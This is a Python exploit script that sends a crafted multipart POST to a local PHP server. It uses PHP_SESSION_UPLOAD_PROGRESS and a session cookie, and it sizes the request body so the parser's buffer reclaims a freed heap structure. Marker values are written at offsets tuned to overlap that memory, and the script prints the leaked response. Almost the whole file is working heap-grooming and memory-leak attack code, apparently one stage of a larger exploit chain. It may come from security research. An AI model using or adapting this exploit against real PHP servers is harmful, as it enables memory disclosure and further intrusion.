#!/usr/bin/env python3
"""Reclaim dt through the multipart body buffer.

The parser's body buffer for a 14-page request is allocated in the free run
main+0x80000..0x8e000: it covers dt at main+0x84000 and stops at d on
main+0x8e000. The marker is placed in the request body at the offset that maps
to dt (0x3fe8 for a zend_string body buffer at 0x80000, 0x4000 for a raw one).

Usage: send_leak.py <port> <sid> <used_slots> [body_pages] [target]
"""
import socket
import sys

port = int(sys.argv[1])
sid = sys.argv[2]
used = int(sys.argv[3])
pages = int(sys.argv[4]) if len(sys.argv) > 4 else 14
target = sys.argv[5] if len(sys.argv) > 5 else "/upload.php"

boundary = b"----leak"
pre = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="g"\r\n\r\n'
)
post = (
    b"\r\n"
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n\r\nZ\r\n'
    b"--" + boundary + b"--\r\n"
)
body_max = pages * 4096 - 64
vsize = body_max - len(pre) - len(post)
val = bytearray(b"L" * vsize)
mark = used.to_bytes(8, "little", signed=True)
for o in (0x3FE8 - len(pre), 0x4000 - len(pre), 0x3FE8, 0x4000, 0x4FE8, 0x5000):
    if 0 <= o <= vsize - 8:
        val[o:o + 8] = mark
body = pre + bytes(val) + post

req = (
    b"POST " + target.encode() + b" HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
) + body

s = socket.create_connection(("127.0.0.1", port), timeout=30)
s.sendall(req)
resp = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        resp += c
except socket.timeout:
    pass
s.close()
head, _, out = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print("body_req=%d body_len=%d" % (len(body), len(out)))
print(out[:100].decode("latin-1", "replace"))
